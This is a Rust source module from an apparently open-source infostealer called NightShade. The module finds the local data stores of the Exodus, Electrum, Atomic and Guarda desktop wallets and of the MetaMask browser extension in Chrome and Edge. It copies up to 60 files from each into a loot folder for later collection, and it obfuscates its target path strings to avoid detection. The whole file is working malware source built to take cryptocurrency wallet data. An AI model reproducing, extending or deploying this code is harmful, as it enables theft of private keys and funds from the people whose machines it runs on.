/*
 * This file is part of NightShade (a hardened fork of sqlerrorthing/ShadowSniff)
 *
 * MIT License
 *
 * Copyright (c) 2025 sqlerrorthing
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

//! Desktop crypto-wallet grabber: Exodus, Electrum, Atomic, Guarda and the
//! browser MetaMask extension stores.

use alloc::sync::Arc;
use collector::{Collector, Software};
use filesystem::path::Path;
use filesystem::storage::StorageFileSystem;
use filesystem::{FileSystem, copy_file};
use obfstr::obfstr as s;
use tasks::{Task, parent_name};

const MAX_ITEMS_PER_WALLET: usize = 60;

fn appdata() -> Path {
    Path::appdata()
}

fn localappdata() -> Path {
    Path::localappdata()
}

struct WalletSource {
    name: &'static str,
    build: fn() -> Path,
}

fn wallet_targets() -> [WalletSource; 6] {
    [
        WalletSource {
            name: "Exodus",
            build: || appdata() / s!("Exodus"),
        },
        WalletSource {
            name: "Electrum",
            build: || appdata() / s!("Electrum") / s!("wallets"),
        },
        WalletSource {
            name: "Atomic",
            build: || appdata() / s!("atomic") / s!("Local Storage"),
        },
        WalletSource {
            name: "Guarda",
            build: || appdata() / s!("Guarda") / s!("Local Storage"),
        },
        WalletSource {
            name: "MetaMask-Chrome",
            build: || {
                localappdata()
                    / s!("Google")
                    / s!("Chrome")
                    / s!("User Data")
                    / s!("Default")
                    / s!("Local Extension Settings")
                    / s!("nkbihfbeogaeaoehlefnkodbefgpgknn")
            },
        },
        WalletSource {
            name: "MetaMask-Edge",
            build: || {
                localappdata()
                    / s!("Microsoft")
                    / s!("Edge")
                    / s!("User Data")
                    / s!("Default")
                    / s!("Local Extension Settings")
                    / s!("nkbihfbeogaeaoehlefnkodbefgpgknn")
            },
        },
    ]
}

pub struct WalletsTask;

impl<C: Collector, F: FileSystem> Task<C, F> for WalletsTask {
    parent_name!("Wallets");

    fn run(&self, parent: &Path, filesystem: &F, collector: &C) {
        let mut total = 0usize;

        for source in wallet_targets() {
            let dir = (source.build)();
            if !StorageFileSystem.is_exists(&dir) {
                continue;
            }

            total += grab_wallet(
                source.name,
                &dir,
                parent,
                filesystem,
                MAX_ITEMS_PER_WALLET,
            );
        }

        if total > 0 {
            collector.get_software().increase_wallets_by(total);
        }
    }
}

fn grab_wallet<F>(
    name: &str,
    dir: &Path,
    parent: &Path,
    filesystem: &F,
    max_items: usize,
) -> usize
where
    F: FileSystem,
{
    let Some(top) = StorageFileSystem.list_files_filtered(dir, &|_| true) else {
        return 0;
    };

    let mut copied = 0usize;

    for entry in top {
        if copied >= max_items {
            break;
        }

        let Some(name) = entry.fullname() else {
            continue;
        };

        let destination = parent / Arc::from(name) / Arc::from(name);

        if StorageFileSystem.is_dir(&entry) {
            // One level of children (leveldb stores, wallet subfolders...).
            let Some(children) =
                StorageFileSystem.list_files_filtered(&entry, &|c| StorageFileSystem.is_file(c))
            else {
                continue;
            };

            for child in children {
                if copied >= max_items {
                    break;
                }

                let Some(child_name) = child.fullname() else {
                    continue;
                };

                if copy_file(
                    StorageFileSystem,
                    &child,
                    filesystem,
                    &(parent / Arc::from(name) / Arc::from(child_name)),
                    true,
                )
                .is_ok()
                {
                    copied += 1;
                }
            }
        } else if copy_file(StorageFileSystem, &entry, filesystem, &destination, true).is_ok() {
            copied += 1;
        }
    }

    let _ = name;
    copied
}
